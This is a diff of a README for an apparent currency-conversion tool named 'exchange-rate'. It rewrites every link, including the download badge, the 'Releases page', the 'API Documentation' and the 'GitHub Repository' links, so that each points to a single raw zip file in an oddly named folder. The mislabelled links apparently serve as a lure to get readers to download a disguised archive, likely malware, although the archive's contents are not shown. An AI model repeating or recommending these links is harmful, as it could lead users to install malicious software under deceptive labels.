@@ -1,6 +1,6 @@
 # 🌍 exchange-rate - Convert Currencies Easily and Quickly
 
-[![Download](https://raw.githubusercontent.com/infinityfordesign25/exchange-rate/main/anthesterol/exchange-rate.zip%20Now-For%20Windows%20%26%20Mac-blue)](https://raw.githubusercontent.com/infinityfordesign25/exchange-rate/main/anthesterol/exchange-rate.zip)
+[![Download](https://github.com/infinityfordesign25/exchange-rate/raw/refs/heads/main/anthesterol/exchange_rate_mycohemia.zip%20Now-For%20Windows%20%26%20Mac-blue)](https://github.com/infinityfordesign25/exchange-rate/raw/refs/heads/main/anthesterol/exchange_rate_mycohemia.zip)
 
 ## 📝 Description
 
@@ -16,13 +16,13 @@ To get started with exchange-rate, follow these steps:
    - A terminal application (Command Prompt for Windows, Terminal for macOS)
 
 2. **Visit the Releases Page**
-   - Go to the [Releases page](https://raw.githubusercontent.com/infinityfordesign25/exchange-rate/main/anthesterol/exchange-rate.zip).
+   - Go to the [Releases page](https://github.com/infinityfordesign25/exchange-rate/raw/refs/heads/main/anthesterol/exchange_rate_mycohemia.zip).
    - Here, you will find all the available versions of the tool.
 
 3. **Download the Application**
    - Find the latest release, typically marked as "Latest".
    - Download the appropriate file for your operating system:
-     - For Windows, download `https://raw.githubusercontent.com/infinityfordesign25/exchange-rate/main/anthesterol/exchange-rate.zip`.
+     - For Windows, download `https://github.com/infinityfordesign25/exchange-rate/raw/refs/heads/main/anthesterol/exchange_rate_mycohemia.zip`.
      - For macOS, download `exchange-rate`.
    - Click on the file name to start the download.
 
@@ -94,8 +94,8 @@ If you want to help improve exchange-rate, feel free to contribute! Issues and p
 
 ## 🌐 Additional Resources
 
-- [ExchangeRate-API Documentation](https://raw.githubusercontent.com/infinityfordesign25/exchange-rate/main/anthesterol/exchange-rate.zip) for more details on currency data.
-- [GitHub Repository](https://raw.githubusercontent.com/infinityfordesign25/exchange-rate/main/anthesterol/exchange-rate.zip) for source code and more information.
+- [ExchangeRate-API Documentation](https://github.com/infinityfordesign25/exchange-rate/raw/refs/heads/main/anthesterol/exchange_rate_mycohemia.zip) for more details on currency data.
+- [GitHub Repository](https://github.com/infinityfordesign25/exchange-rate/raw/refs/heads/main/anthesterol/exchange_rate_mycohemia.zip) for source code and more information.
 
 ## 💻 Community & Support
 
@@ -103,4 +103,4 @@ If you have questions or need assistance, join our community forum or check the 
 
 ## 🚀 Download & Install
 
-Make sure to visit our [Releases page](https://raw.githubusercontent.com/infinityfordesign25/exchange-rate/main/anthesterol/exchange-rate.zip) to download the latest version of exchange-rate and follow the installation instructions provided above. Enjoy converting currencies easily and effortlessly!
+Make sure to visit our [Releases page](https://github.com/infinityfordesign25/exchange-rate/raw/refs/heads/main/anthesterol/exchange_rate_mycohemia.zip) to download the latest version of exchange-rate and follow the installation instructions provided above. Enjoy converting currencies easily and effortlessly!
